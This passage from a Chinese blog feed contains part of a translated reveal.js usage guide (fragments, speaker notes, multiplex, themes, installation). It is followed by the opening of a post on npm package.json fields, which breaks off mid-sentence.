</code></pre><h2 id="内部链接"><a href="#内部链接" class="headerlink" title="内部链接"></a>内部链接</h2><p>很容易就可以实现幻灯片之间的链接。下面第一个例子是针对某一张幻灯片进行链接，而第二个，则用 ID 属性进行链接至另一张幻灯片。(<code>&lt;section id=&quot;some-slide&quot;&gt;</code>)</p><p><code>For Example:</code></p><pre><code class="html">&lt;a href=&quot;#/2/2&quot;&gt;Link&lt;/a&gt;
&lt;a href=&quot;#/some-slide&quot;&gt;Link&lt;/a&gt;
</code></pre><p>你还可以添加相对导航链接，类似于内置在 <code>reveal.js</code> 的控件, 可以在任何元素上附加以下其中一个 <code>class</code>。需要注意的是，在它的基础上，当前的幻灯片一个有效的导航路线的每个元素将会被自动给予 <code>enabled</code> 类。</p><p><code>For Example:</code></p><pre><code class="html">&lt;a href=&quot;#&quot; class=&quot;navigate-left&quot;&gt;
&lt;a href=&quot;#&quot; class=&quot;navigate-right&quot;&gt;
&lt;a href=&quot;#&quot; class=&quot;navigate-up&quot;&gt;
&lt;a href=&quot;#&quot; class=&quot;navigate-down&quot;&gt;
&lt;a href=&quot;#&quot; class=&quot;navigate-prev&quot;&gt; &lt;!-- 之前幻灯片垂直或水平滑动 --&gt;
&lt;a href=&quot;#&quot; class=&quot;navigate-next&quot;&gt; &lt;!-- 下一个幻灯片垂直或水平滑动 --&gt;
</code></pre><h2 id="片段"><a href="#片段" class="headerlink" title="片段"></a>片段</h2><p>片段被用于突出幻灯片上单个元素。这类片段的每个元素都将在下一个幻灯片之前显示。这里有个例子：<a href="http://lab.hakim.se/reveal-js/#/fragments" target="_blank" rel="external">http://lab.hakim.se/reveal-js/#/fragments</a>。</p><p>默认片段风格是启动了淡入淡出效果。这种风格可以通过在片段中添加不同类而被改变不同效果。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section&gt;
  &lt;p class=&quot;fragment grow&quot;&gt;grow&lt;/p&gt;
  &lt;p class=&quot;fragment shrink&quot;&gt;shrink&lt;/p&gt;
  &lt;p class=&quot;fragment fade-out&quot;&gt;fade-out&lt;/p&gt;
  &lt;p class=&quot;fragment fade-up&quot;&gt;fade-up (also down, left and right!)&lt;/p&gt;
  &lt;p class=&quot;fragment current-visible&quot;&gt;visible only once&lt;/p&gt;
  &lt;p class=&quot;fragment highlight-current-blue&quot;&gt;blue only once&lt;/p&gt;
  &lt;p class=&quot;fragment highlight-red&quot;&gt;highlight-red&lt;/p&gt;
  &lt;p class=&quot;fragment highlight-green&quot;&gt;highlight-green&lt;/p&gt;
  &lt;p class=&quot;fragment highlight-blue&quot;&gt;highlight-blue&lt;/p&gt;
&lt;/section&gt;
</code></pre><p>多个片段可以通过包裹它而被应用到相同的元件顺序之中，这将在第一步骤中的文本淡入之后淡出第二个。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section&gt;
  &lt;span class=&quot;fragment fade-in&quot;&gt;
    &lt;span class=&quot;fragment fade-out&quot;&gt;I&#39;ll fade in, then out&lt;/span&gt;
  &lt;/span&gt;
&lt;/section&gt;
</code></pre><p>片段的显示顺序可以通过 <code>data-fragment-index</code> 属性来控制。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section&gt;
    &lt;p class=&quot;fragment&quot; data-fragment-index=&quot;3&quot;&gt;Appears last&lt;/p&gt;
    &lt;p class=&quot;fragment&quot; data-fragment-index=&quot;1&quot;&gt;Appears first&lt;/p&gt;
    &lt;p class=&quot;fragment&quot; data-fragment-index=&quot;2&quot;&gt;Appears second&lt;/p&gt;
&lt;/section&gt;
</code></pre><h2 id="片段事件"><a href="#片段事件" class="headerlink" title="片段事件"></a>片段事件</h2><p>当任一幻灯片片段显示或隐藏时 <code>reveal.js</code> 将派遣一个事件。</p><p>一些库，如 <code>MathJax</code>（见 <a href="//github.com/hakimel/reveal.js/issues/505">#505</a>）,可以获取到最初隐藏幻灯片片段的困惑。很多时候，可以在回调中通过调用更新或者给予方法来确立。</p><p><code>For Example:</code></p><pre><code class="javascript">Reveal.addEventListener( &#39;fragmentshown&#39;, function( event ) {
  // event.fragment = the fragment DOM element
} );
Reveal.addEventListener( &#39;fragmenthidden&#39;, function( event ) {
  // event.fragment = the fragment DOM element
} );
</code></pre><h2 id="代码语法高亮"><a href="#代码语法高亮" class="headerlink" title="代码语法高亮"></a>代码语法高亮</h2><p>默认情况下，<code>Reveal</code> 配置了 <code>highlight.js</code> 来支持代码语法高亮。下面的例子中，<code>clojure</code> 代码就使用了代码语法高亮。当 <code>data-trim</code> 属性存在时，周围的空格被自动删除。<code>HTML</code> 将被默认逃脱。为了避免这种情况，举个例子，如果你想要用 <code>mark</code> 标签高亮代码行，你得在 <code>code</code> 标签上指定 <code>data-noescape</code> 属性。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section&gt;
  &lt;pre&gt;
    &lt;code data-trim data-noescape&gt;
      (def lazy-fib
      (concat
      [0 1]
      &lt;mark&gt;((fn rfib [a b]&lt;/mark&gt;
      (lazy-cons (+ a b) (rfib b (+ a b)))) 0 1)))
    &lt;/code&gt;
  &lt;/pre&gt;
&lt;/section&gt;
</code></pre><h2 id="幻灯片页码"><a href="#幻灯片页码" class="headerlink" title="幻灯片页码"></a>幻灯片页码</h2><p>如果你想要显示当前的幻灯片页码，你得在配置中配置 <code>slideNumber</code> 的值。</p><p><code>Example Configuration:</code></p><pre><code class="javascript">// 显示认格式的幻灯片编号
Reveal.configure({ slideNumber: true });

// 幻灯片编号格式可以用这些变量进行配置：
//  &quot;h.v&quot;:  水平.上下滑动数（默认）
//  &quot;h/v&quot;:  水平/垂直幻灯片编号
//    &quot;c&quot;:  当前幻灯片编号
//  &quot;c/t&quot;:  当前幻灯片编号/总幻灯片数
Reveal.configure({ slideNumber: &#39;c/t&#39; });
</code></pre><h2 id="概览模式"><a href="#概览模式" class="headerlink" title="概览模式"></a>概览模式</h2><p>按 <code>“ESC”</code> 或 <code>“O”</code> 键来打开和关闭概览模式。当你在这种模式下， 你仍然可以在幻灯片之间导航，因此你的演示文稿需要在千分尺以上。</p><p><code>For Example:</code></p><pre><code class="javascript">Reveal.addEventListener( &#39;overviewshown&#39;, function( event ) { /* ... */ } );
Reveal.addEventListener( &#39;overviewhidden&#39;, function( event ) { /* ... */ } );

// 编程切换概览模式
Reveal.toggleOverview();
</code></pre><h2 id="全屏模式"><a href="#全屏模式" class="headerlink" title="全屏模式"></a>全屏模式</h2><p>只要按下键盘上的 <code>F</code> 键来全屏显示你的演示文稿。按 <code>Esc</code> 键退出全屏模式。</p><h2 id="嵌入式媒体"><a href="#嵌入式媒体" class="headerlink" title="嵌入式媒体"></a>嵌入式媒体</h2><p>嵌入式 <code>HTML5</code> 的 <code>video</code> 标签和引入的 <code>iframe</code>会在你离开幻灯片时自动暂停。 这可以通过在元素上用一个 <code>data-ignore</code> 属性来禁用它。</p><p>如果你想要在幻灯片显示时自动开始播放，你得在你的媒体元素上添加 <code>data-autoplay</code>。</p><p><code>For Example:</code></p><pre><code class="html">&lt;video data-autoplay src=&quot;//clips.vorwaerts-gmbh.de/big_buck_bunny.mp4&quot;&gt;
&lt;/video&gt;
</code></pre><p>此外，该框架会自动得将两次 <code>post</code> 信息传递给所有的 <code>iframes</code>， 当 <code>iframe</code> 里的幻灯片内容可见时使用 <code>slide:start</code>，当要隐藏时使用 <code>slide:stop</code>。</p><h2 id="延伸元素"><a href="#延伸元素" class="headerlink" title="延伸元素"></a>延伸元素</h2><p>有时候，它需要一个元素，像 <code>image</code> 或者<code>video</code>，延伸到一个给定的幻灯片中消耗尽可能多的空间。这可以通过在元素上添加 <code>.stretch</code> 类来完成。：</p><p><code>For Example:</code></p><pre><code class="html">&lt;section&gt;
  &lt;h2&gt;This video will use up the remaining space on the slide&lt;/h2&gt;
  &lt;video class=&quot;stretch&quot; src=&quot;//clips.vorwaerts-gmbh.de/big_buck_bunny.mp4&quot;&gt;&lt;/video&gt;
&lt;/section&gt;
</code></pre><p>限制：</p><ul><li>只有幻灯片部分的直接后代可以被拉伸</li><li>只有每张幻灯片部分的一个后代可以被拉伸</li></ul><h2 id="postMessage-API"><a href="#postMessage-API" class="headerlink" title="postMessage API"></a>postMessage API</h2><p>当与另一个窗口的演示文稿通信时，该框架有 <code>built-in</code> 的 <code>postMessage API</code> 来帮助你。这里是展示了，你要怎样使用 <code>reveal.js</code> 在给定的窗口进行滑动的例子。</p><p><code>For Example:</code></p><pre><code class="javascript">window.postMessage( JSON.stringify({ method: &#39;slide&#39;, args: [ 2 ] }), &#39;*&#39; );
</code></pre><p>当 <code>reveal.js</code> 在 <code>iframe</code> 内部运行时它可以选择性地在所有的事件的父级冒泡。冒泡事件字符串化 <code>JSON</code> 的三个领域：<code>namespace</code>, <code>eventName</code> 和 <code>state</code>。这里是你如何从父窗口订阅它们。</p><p><code>For Example:</code></p><pre><code class="javascript">window.addEventListener( &#39;message&#39;, function( event ) {
  var data = JSON.parse( event.data );
  if( data.namespace === &#39;reveal&#39; &amp;&amp; data.eventName ===&#39;slidechanged&#39; ) {
      // Slide changed, see data.state for slide number
  }
} );
</code></pre><p><code>cross-window</code> 可以在配置标志中开启或者关闭信息。</p><p><code>Example Configuration:</code></p><pre><code class="javascript">Reveal.initialize({
  ...,

  // Exposes the reveal.js API through window.postMessage
  postMessage: true,

  // Dispatches all reveal.js events to the parent window through postMessage
  postMessageEvents: false
});
</code></pre><h1 id="PDF-导出"><a href="#PDF-导出" class="headerlink" title="PDF 导出"></a>PDF 导出</h1><p>演示文稿可以通过特殊的打印样式表导出为 <code>PDF</code>。你需要在 <a href="//google.com/chrome">Google Chrome</a> 或者 <a href="//www.chromium.org/Home">Chromium</a> 发送请求。这里是一个已经上传到 <code>SlideShare</code> 上的呈现的一个例子<a href="http://www.slideshare.net/hakimel/revealjs-300" target="_blank" rel="external">http://www.slideshare.net/hakimel/revealjs-300</a></p><ol><li>打开你的演示文稿，在地址栏的查询字符串中添加 <code>print-pdf</code> 参数。这会默认的触发 <code>HTML</code> 加载 <code>PDF</code> 样式表 <code>(css/print/pdf.css)</code>。你可以在 <a href="//lab.hakim.se/reveal-js?print-pdf">lab.hakim.se/reveal-js?print-pdf</a> 这里测试。</li><li>在浏览器中打开打印对话框 <code>(CTRL/CMD+P)</code>。</li><li>更改 <strong>Destination</strong> 设置为 <strong>Save as PDF</strong>。</li><li>在 <strong>Layout</strong> 中更改为 <strong>Landscape</strong>。</li><li>在 <strong>Margins</strong> 中更改为 <strong>None</strong>。</li><li>启用 <strong>Background graphics</strong> 选项。</li><li>点击 <strong>Save</strong>。</li></ol><p>另外，你可以使用 <a href="//github.com/astefanutti/decktape">decktape</a> 选项。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/reveal-js-pdf.png" alt="PDF 导出"></p><blockquote><p>我试过保存 <code>PDF</code> 的功能，有内容会重叠，导出的内容也是怪怪的，怀疑是样式没有处理好。</p></blockquote><h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><p>这个框架默认包含着一些默认的主题。</p><ul><li><strong>black</strong>: 黑色背景，白色文本，蓝色链接（默认主题）</li><li><strong>white</strong>: 白色背景，黑色文本，蓝色链接</li><li><strong>league</strong>: 灰色背景，白色文本，蓝色链接（reveal.js 小于 3.0.0 默认的主题）</li><li><strong>beige</strong>: 米色背景，深色文本，棕色链接</li><li><strong>sky</strong>: 蓝色背景，瘦黑文本，蓝色链接</li><li><strong>night</strong>: 黑色背景，亮白文本，橙色链接</li><li><strong>serif</strong>: 卡布奇诺背景，灰色文本，棕色链接</li><li><strong>simple</strong>: 白色背景，黑色文本，蓝色的链接</li><li><strong>solarized</strong>: 米色背景，深绿色文本，蓝色链接</li></ul><p>每个主题可以作为一个独立的样式表。 要更改主题，你只要在 <code>HTML</code> 中将以下代码中的 <strong>black</strong> 修改就可以了。</p><p><code>Example Configuration:</code></p><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/theme/black.css&quot; id=&quot;theme&quot;&gt;
</code></pre><p>如果你想添加自己的主题，看这里的帮助： <a href="//github.com/hakimel/reveal.js/blob/master/css/theme/README.md">/css/theme/README.md</a></p><blockquote><p><code>reveal.js</code> 提供了多种样式。可以通过引用不同的主题来实现。具体主题查看 <code>reveal.js/css/theme</code> 下的 <code>css</code> 文件。</p></blockquote><h1 id="演讲者备注"><a href="#演讲者备注" class="headerlink" title="演讲者备注"></a>演讲者备注</h1><p><code>reveal.js</code> 自带演讲者备注插件，它可以在一个单独的浏览器窗口中呈现每个幻灯片备注。即使你没有写任何注释，注释窗口呈现的下一个即将到来的幻灯片预览也会给你带来帮助。按你的键盘上的 <code>S</code> 键来开启备注窗口。</p><p>如下所示，备注只要在幻灯片中追加一个 <code>aside</code> 元素。如果你想要通过 <code>Markdown</code> 格式来书写你的备注，你可以在<code>aside</code> 元素上添加 <code>data-markdown</code> 属性。</p><p>另外，你可以在幻灯片中使用 <code>data-notes</code> 属性添加你的备注。如：<code>&lt;section data-notes=&quot;Something important&quot;&gt;&lt;/section&gt;</code>。</p><p>当在本地使用，此功能要求 <code>reveal.js</code> 从本地 <code>Web</code> 服务器中运行。本地 <code>Web</code> 服务器推荐使用 <code>Node.js</code>。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section&gt;
  &lt;h2&gt;Some Slide&lt;/h2&gt;

  &lt;aside class=&quot;notes&quot;&gt;
    Oh hey, these are some notes. They&#39;ll be hidden in your presentation, but you can see them if you open the speaker notes window (hit &#39;s&#39; on your keyboard).
  &lt;/aside&gt;
&lt;/section&gt;
</code></pre><p>如果你想要引入外部的 <code>Markdown</code> 文件，你可以在一个特殊分隔符的帮助下添加注释：</p><p><code>For Example:</code></p><pre><code class="html">&lt;section  data-markdown=&quot;example.md&quot;
          data-separator=&quot;^\n\n\n&quot;
          data-separator-vertical=&quot;^\n\n&quot; data-separator-notes=&quot;^Note:&quot;&gt;&lt;/section&gt;

# Title
## Sub-title

Here is some content...

Note:
This will only display in the notes window.
</code></pre><h2 id="共享和打印演讲者备注"><a href="#共享和打印演讲者备注" class="headerlink" title="共享和打印演讲者备注"></a>共享和打印演讲者备注</h2><p>备注并不是在所有的观看者的视图中可见。如果你想与他人分享你的笔记，你可在初始化 <code>reveal.js</code> 时，设置 <code>showNotes: true</code>。备注将在演示文稿的底部出现。</p><p>当 <code>showNotes</code> 启用，你导出为 <code>PDF</code> 的笔记也包括在内。</p><h2 id="演讲者备注服务器端"><a href="#演讲者备注服务器端" class="headerlink" title="演讲者备注服务器端"></a>演讲者备注服务器端</h2><p>在某些情况下，可以期望在一个单独的设备上呈现并运行的注释。<code>Node.js-based</code> 备注插件，让你做到使用相同的备注定义它对应的客户端。通过添加以下的依赖关系来包含所需的脚本。</p><p><code>Example Configuration:</code></p><pre><code class="javascript">Reveal.initialize({
    ...

    dependencies: [
        { src: &#39;socket.io/socket.io.js&#39;, async: true },
        { src: &#39;plugin/notes-server/client.js&#39;, async: true }
    ]
});
</code></pre><p>然后：</p><ol><li>下载 <a href="//nodejs.org/">Node.js</a> (1.0.0 或者最新)</li><li>运行<code>npm install</code></li><li>运行 <code>node plugin/notes-server</code></li></ol><h1 id="复用"><a href="#复用" class="headerlink" title="复用"></a>复用</h1><p>复用插件可以让你的观众，观看你控制自己的手机，平板电脑或笔记本电脑来演示幻灯片。作为主导航演示幻灯片，所有的用户演示将会实时更新。这里有个 <code>demo</code> ：<a href="http://reveal-js-multiplex-ccjbegmaii.now.sh/" target="_blank" rel="external">http://reveal-js-multiplex-ccjbegmaii.now.sh/</a>。</p><p>复用插件需要以下三件事来操作：</p><ol><li>拥有控制权的主演讲文稿。</li><li>客户端演示文稿跟随着主机</li><li><code>Socket.io</code> 服务器从主到客户端广播事件</li></ol><p>更多细节：</p><h2 id="主演示文稿"><a href="#主演示文稿" class="headerlink" title="主演示文稿"></a>主演示文稿</h2><p>只有主持人从一个静态文件服务器访问（最好）服务。这个只需要在你（演示者）的计算机上。（它的安全性是从你自己的电脑运行主演示文稿，因此网络得不停的下载。）在你的主呈现的目录执行以下命令：</p><ol><li><code>npm install node-static</code></li><li><code>static</code></li></ol><p>如果你想要在你想要在你的主演示文稿用演讲者备注插件，就得确保你有演讲者备注插件并与沿着下面所示的配置正确配置，然后在你的主演示文稿目录下执行 <code>node plugin/notes-server</code>。下面的配置是导致它连接到 <code>socket.io</code> 服务器，以及启动 <code>speaker-notes/static-file</code> 服务为主。</p><p>你可以用 <code>//localhost:1947</code> 访问你的主演示文稿。</p><p><code>Example Configuration:</code></p><pre><code class="javascript">Reveal.initialize({
  // 其他选项...

  multiplex: {
    // 举例值。 生成自己的，在 socket.io 服务器上查看说明。
    secret: &#39;13652805320794272084&#39;,
    // 从 socket.io 服务器上获取. 给予（主）演示文稿控制权
    id: &#39;1ea875674b17ca76&#39;, // id，从 socket.io 服务器上获取
    url: &#39;//reveal-js-multiplex-ccjbegmaii.now.sh&#39; // socket.io 服务器地址
  },

  // 不要忘记添加依赖
  dependencies: [
    { src: &#39;//cdn.socket.io/socket.io-1.3.5.js&#39;, async: true },
    { src: &#39;plugin/multiplex/master.js&#39;, async: true },

    // 如果你想广播备注
    { src: &#39;plugin/notes-server/client.js&#39;, async: true }

    // 其他依赖...
  ]
});
</code></pre><h2 id="客户端演示文稿"><a href="#客户端演示文稿" class="headerlink" title="客户端演示文稿"></a>客户端演示文稿</h2><p>服务器来自公共的无障碍的静态文件服务器。包含示例，<code>GitHub Pages</code>, <code>Amazon S3</code>, <code>Dreamhost</code>, <code>Akamai</code>, 等等。更可靠，更好。你的观众则可以通过访问客户端的演示文稿：<code>ttp://example.com/path/to/presentation/client/index.html</code>，下面的配置是用来来连接到 <code>socket.io</code> 服务器的客户端。</p><p><code>Example configuration:</code></p><pre><code class="javascript">Reveal.initialize({
  // 其他选项...

  multiplex: {
    // 举例值。 生成自己的，在 socket.io 服务器上查看说明。
    secret: null, // 空，因为客户端不必需要主演示文稿控制权
    id: &#39;1ea875674b17ca76&#39;, // id, 在 socket.io 服务器获取
    url: &#39;//reveal-js-multiplex-ccjbegmaii.now.sh&#39; // socket.io 服务器地址
  },

  // 不要忘记添加依赖
  dependencies: [
    { src: &#39;//cdn.socket.io/socket.io-1.3.5.js&#39;, async: true },
    { src: &#39;plugin/multiplex/client.js&#39;, async: true }

    // 其他依赖..
  ]
});
</code></pre><h2 id="socket-io-服务器"><a href="#socket-io-服务器" class="headerlink" title="socket.io 服务器"></a>socket.io 服务器</h2><p>从主演示文稿服务器上获取 <code>slideChanged</code> 事件，并在连接的客户播放演示文稿。这需要公开访问。你可以在 <code>socket.io</code> 服务器上运行以下命令：</p><ol><li><code>npm install</code></li><li><code>node plugin/multiplex</code></li></ol><p>或者你在 <code>socket.io</code> 服务器上使用 <a href="http://reveal-js-multiplex-ccjbegmaii.now.sh/" target="_blank" rel="external">http://reveal-js-multiplex-ccjbegmaii.now.sh/</a>。</p><p>你需要在你的主机和客户端演示文稿中生成一个唯一的秘密和令牌。要做到这一点，访问 <code>//example.com/token</code>，而 <code>//example.com/</code> 是你的 <code>socket.io</code> 服务器链接地址。或者你在 <code>socket.io</code> 服务器去用 <a href="http://reveal-js-multiplex-ccjbegmaii.now.sh/" target="_blank" rel="external">http://reveal-js-multiplex-ccjbegmaii.now.sh/</a>, 访问 <a href="http://reveal-js-multiplex-ccjbegmaii.now.sh/token" target="_blank" rel="external">http://reveal-js-multiplex-ccjbegmaii.now.sh/token</a>。</p><p>你可以在你的 <code>socket.io</code> 服务器运行 <a href="http://reveal-js-multiplex-ccjbegmaii.now.sh/" target="_blank" rel="external">http://reveal-js-multiplex-ccjbegmaii.now.sh/</a>，但可用性和稳定性不能保证。对于任何关键任务，我建议你运行你自己的服务器。这是简单部署到 <code>nodejitsu</code>，<code>Heroku</code>，您自己的环境，等等。</p><h3 id="socket-io-服务器是文件静态服务器"><a href="#socket-io-服务器是文件静态服务器" class="headerlink" title="socket.io 服务器是文件静态服务器"></a><code>socket.io</code> 服务器是文件静态服务器</h3><p>该 <code>socket.io</code> 服务器可以作为播放静态文件服务器，为您的客户演示，这里有个例子：<a href="http://reveal-js-multiplex-ccjbegmaii.now.sh/" target="_blank" rel="external">http://reveal-js-multiplex-ccjbegmaii.now.sh/</a>。（在两个浏览器打开 <a href="http://reveal-js-multiplex-ccjbegmaii.now.sh/" target="_blank" rel="external">http://reveal-js-multiplex-ccjbegmaii.now.sh/</a>，通过在一个幻灯片浏览，并且其他的将匹配更新。）</p><p><code>Example configuration:</code></p><pre><code class="javascript">Reveal.initialize({
  // 其他选项...

  multiplex: {
    // 举例值。 生成自己的，在 socket.io 服务器上查看说明。
    secret: null, // 空，因为客户端不必需要主演示文稿控制权
    id: &#39;1ea875674b17ca76&#39;, // id, 在 socket.io 服务器获取
    url: &#39;example.com:80&#39; // socket.io 服务器地址
  },

  // 不要忘记添加依赖
  dependencies: [
    { src: &#39;//cdn.socket.io/socket.io-1.3.5.js&#39;, async: true },
    { src: &#39;plugin/multiplex/client.js&#39;, async: true }

    // 其他依赖...
  ]
});
</code></pre><p>它也可以作为播放静态文件服务器，为您的主演示和客户端在同一时间演示（只要你不希望使用演讲者备注）。在两个浏览器打开 <a href="http://reveal-js-multiplex-ccjbegmaii.now.sh/" target="_blank" rel="external">http://reveal-js-multiplex-ccjbegmaii.now.sh/</a>，通过在一个幻灯片浏览，并且其他的将匹配更新。）这可能是不可取的，因为你不希望你的听众与你呈现的幻灯片混淆。</p><p><code>Example configuration:</code></p><pre><code class="javascript">Reveal.initialize({
  // 其他选项...

  multiplex: {
    // 举例值。 生成自己的，在 socket.io 服务器上查看说明。
    secret: &#39;13652805320794272084&#39;,
    // 从 socket.io 服务器上获取. 给予（主）演示文稿控制权
    id: &#39;1ea875674b17ca76&#39;, // id, 在 socket.io 服务器获取r
    url: &#39;example.com:80&#39; // socket.io 服务器地址
  },

  // 不要忘记添加依赖
  dependencies: [
    { src: &#39;//cdn.socket.io/socket.io-1.3.5.js&#39;, async: true },
    { src: &#39;plugin/multiplex/master.js&#39;, async: true },
    { src: &#39;plugin/multiplex/client.js&#39;, async: true }

    // 其他依赖...
  ]
});
</code></pre><h1 id="MathJax"><a href="#MathJax" class="headerlink" title="MathJax"></a>MathJax</h1><p>如果你想在演示文稿中显示的数学方程，你可以通过包含这个插件。该插件是围绕 <a href="//www.mathjax.org/">MathJax</a> 库的一个非常薄的包装。要使用它，你需要将它作为一个 <code>reveal.js</code> 依赖，<a href="//github.com/hakimel/reveal.js/#dependencies">这里有更多关于这个依赖的解释</a>。</p><p>该插件默认使用 <a href="//en.wikipedia.org/wiki/LaTeX">LaTex</a>，但是你可以通过调整配置对象中的 <code>math</code>。注意，<code>MathJax</code> 是从远程服务器加载的。如果你想要离线使用，你需要下载并且复制到目录，然后调整 <code>mathjax</code> 的配置值。</p><p>下面是插件如何被配置的例子。如果你不打算改变这些值，你不必包含 <code>math</code> 配置对象里的所有内容。</p><pre><code class="javascript">Reveal.initialize({
  // 其他选项 ...

  math: {
    mathjax: &#39;//cdn.mathjax.org/mathjax/latest/MathJax.js&#39;,
    config: &#39;TeX-AMS_HTML-full&#39;
    // //docs.mathjax.org/en/latest/config-files.html
  },

  dependencies: [
    { src: &#39;plugin/math/math.js&#39;, async: true }
  ]
});
</code></pre><p>如果你需要 <a href="//docs.mathjax.org/en/latest/start.html#secure-access-to-the-cdn">HTTPS delivery</a> 或者更加稳定的 <a href="//docs.mathjax.org/en/latest/configuration.html#loading-mathjax-from-the-cdn">specific versions</a> ，请阅读 <code>MathJax</code> 的文档。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>基本设置仅用于创作演示文稿。你可以访问所有 <code>reveal.js</code> 功能和插件，需要完整的配置，如演讲者备注，以及做出更改源所需的开发任务。</p><h2 id="基本设置"><a href="#基本设置" class="headerlink" title="基本设置"></a>基本设置</h2><p><code>reveal.js</code> 的核心是非常容易安装。你只需要直接在浏览器下载复制该资源库，并打开 <code>index.html</code> 文件。</p><ol><li>从 <a href="https://github.com/hakimel/reveal.js/releases" target="_blank" rel="external">https://github.com/hakimel/reveal.js/releases</a> 下载最新版本的 reveal.js</li><li>解压缩并用自己的 <code>index.html</code> 替换例子中的内容</li><li>在浏览器打开 <code>index.html</code> 并查看它</li></ol><h2 id="全部设置"><a href="#全部设置" class="headerlink" title="全部设置"></a>全部设置</h2><p>一些 <code>reveal.js</code> 特征，如外部的 <code>Markdown</code> 和演讲这备注，要求演示文稿从本地 <code>Web 服务器</code>上运行。以下说明将设立这样的服务器，以及所有的进行编辑的 reveal.js 源代码所需的开发服务。</p><ol><li>下载 <a href="//nodejs.org/">Node.js</a> (1.0.0 或者更新)</li><li><p>克隆 <code>reveal.js</code> 目录</p><pre><code class="bash">$ git clone https://github.com/hakimel/reveal.js.git
</code></pre></li><li><p>进入 <code>reveal.js</code> 目录导航</p><pre><code class="bash">$ cd reveal.js
</code></pre></li><li><p>安装依赖</p><pre><code class="bash">$ npm install
</code></pre></li><li><p>演示文稿的服务器和监视源文件的修改</p><pre><code class="bash">$ npm start
</code></pre></li><li><p>打开 <code>&lt;http://localhost:8000&gt;</code> 来观看你的演示文稿</p><p>你可以使用 <code>npm start -- --port 8001</code> 修改端口。</p></li></ol><h1 id="目录结果"><a href="#目录结果" class="headerlink" title="目录结果"></a>目录结果</h1><ul><li><strong>css/</strong> 核心样式，如果没有这些则项目不起作用</li><li><strong>js/</strong> 和上面一样，但对 <code>JavaScript</code> 而言</li><li><strong>plugin/</strong> 已经作为开发扩展 <code>reveal.js</code> 部件</li><li><strong>lib/</strong> 所有第三方资源库(JavaScript, CSS, fonts)</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>用 <code>reveal.js</code> 来实现幻灯片，可以只关注内容，忽略各种切换效果。而且可以使用 <code>Markdown</code> 来实现，大大提高了编写效率。对于最后生成的 <code>html</code> 文件，可以部署到服务器，这样只需要网络就可以进行分享，不需要使用U盘拷来拷去了。</p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> manual </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> CSS </tag>
            
            <tag> Code </tag>
            
            <tag> HTML5 </tag>
            
            <tag> Node.js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解读 npm 中的 package.json]]></title>
      <url>/2016/08/talk-package-json-on-npm/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>package.json 是 Node.js 应用中比较重要的部分，它定义了项目的依赖关系，这里将介绍该文件各个配置项的作用<a id="more"></a></p><h1 id="创建-package-json-文件"><a href="#创建-package-json-文件" class="headerlink" title="创建 package.json 文件"></a>创建 package.json 文件</h1><blockquote><p>安装包的信息可保持到项目的 <code>package.json</code> 文件中，以便后续的其它的项目开发或者他人合作使用，也说 <code>package.json</code> 在项目中是必不可少的。</p></blockquote><pre><code class="bash">npm init
</code></pre><h1 id="package-json-文件解读"><a href="#package-json-文件解读" class="headerlink" title="package.json 文件解读"></a>package.json 文件解读</h1><h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><blockquote><p><code>npm</code> 会根据包内容设置一些默认值。</p></blockquote><ul><li><p><code>&quot;scripts&quot;: {&quot;start&quot;: &quot;node server.js&quot;}</code></p><ul><li>如果包的根目录有 <code>server.js</code> 文件，<code>npm</code> 会默认将 <code>start</code> 命令设置为 <code>node server.js</code>。</li></ul></li><li><p><code>&quot;scripts&quot;:{&quot;preinstall&quot;: &quot;node-waf clean || true; node-waf configure build&quot;}</code></p><ul><li>如果包的根目录有 <code>wscript</code> 文件，<code>npm</code> 会默认将 <code>preinstall</code> 命令用 <code>node-waf</code> 进行编译。</li></ul></li><li><p><code>&quot;scripts&quot;:{&quot;preinstall&quot;: &quot;node-gyp rebuild&quot;}</code></p><ul><li>如果包的根目录有 <code>binding.gyp</code> 文件，<code>npm</code> 会默认将 <code>preinstall</code> 命令用 <code>node-gyp</code> 进行编译。</li></ul></li><li><p><code>&quot;contributors&quot;: [...]</code></p><ul><li>如果包的根目录有 <code>AUTHORS</code> 文件，<code>npm</code> 会默认逐行按 <code>Name &lt;email(url)</code> 格式处理，邮箱和 <code>url</code> 是可选的。<code>#号</code>和<code>空格</code>开头的行会被忽略。</li></ul></li></ul><h2 id="name"><a href="#name" class="headerlink" title="name"></a>name</h2><blockquote><p>在 <code>package.json</code> 中最重要的就是 <code>name</code> 和 <code>version</code> 字段。他们都是必须的，如果没有就无法 <code>install</code>。<code>name</code> 和 <code>version</code> 一起组成的标识在假设中是唯一的。改变包应该同时改变 <code>version</code>。<br><br>name 是这个东西的名字。注意：</p></blockquote><ul><li>不要把 <code>node</code> 或者 <code>js</code> 放在名字中。因为你写了 <code>package.json</code> 它就被假定成为了 <code>js</code>，不过你可以用 <code>&quot;engine&quot;字段</code> 指定一个引擎（见后文）。</li><li>这个名字会作为在 <code>URL</code> 的一部分、命令行的参数或者文件夹的名字。任何 <code>non-url-safe</code> 的字符都是不能用的。</li><li>这个名字可能会作为参数被传入 <code>require()</code>，所以它应该比较短，但也要意义清晰。</li><li>在你爱上你的名字之前，你可能要去 <code>npm registry</code> 查看一下这个名字是否已经被使用了。<a href="http://registry.npmjs.org/" target="_blank" rel="external">http://registry.npmjs.org/</a></li></ul><h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><blockquote><p>在 <code>package.json</code> 中最重要的就是 <code>name</code> 和 <code>version</code> 字段。他们都是必须的，如果没有就无法 <code>install</code>。<code>name</code> 和 <code>version</code> 一起组成的标识在假设中是唯一的。改变包应该同时改变 <code>version</code>。<br><br><code>version</code> 必须能被 